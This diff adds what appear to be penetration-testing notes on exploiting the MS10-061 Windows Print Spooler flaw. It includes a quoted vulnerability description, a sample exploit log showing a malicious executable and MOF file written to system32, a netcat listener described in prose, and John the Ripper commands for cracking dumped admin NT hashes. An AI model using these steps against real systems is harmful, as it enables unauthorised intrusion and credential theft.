@@ -1,0 +1,27 @@
+executable gets written to C:\WINDOWS\system32\W75nXA97wkv3RI.exe
+
+malicious print request that is written to C:\WINDOWS\system32\wbem\mof
+
+This request is use to control execution of the malicious executable above.
+
+on kali:
+Create a netcat listener (-l) on port (-p) 8888 in extreme verbose mode (-vvv) redirecting (>) output into a file (ms10_016.dd)
+
+hashdump:
+
+grep -i admin samhash > adminhash.txt
+cat /dev/null > /root/.john/john.pot
+john --format=nt adminhash.txt
+
+
+The Print Spooler service in Microsoft Windows XP,Server 2003 SP2,Vista,Server 2008, and 7, when printer sharing is enabled,
+-- |       does not properly validate spooler access permissions, which allows remote attackers to create files in a system directory,
+-- |       and consequently execute arbitrary code, by sending a crafted print request over RPC, as exploited in the wild in September 2010,
+-- |       aka "Print Spooler Service Impersonation Vulnerability."
+
+attempting to exploit ms10-061 via \\192.168.1.1\CANON
+printer handle:  00001023012031020310203103201032010321
+Job started: 0x12
+wrote 7388 bytes to  %systemroot%\system32\wk3ri.exe <- malicious executable
+job started: 0x13
+wrote 221 bytes to %systemroot%\wbem\mof\m6QLoY7WZ0tgb9.mof <- malicious print request
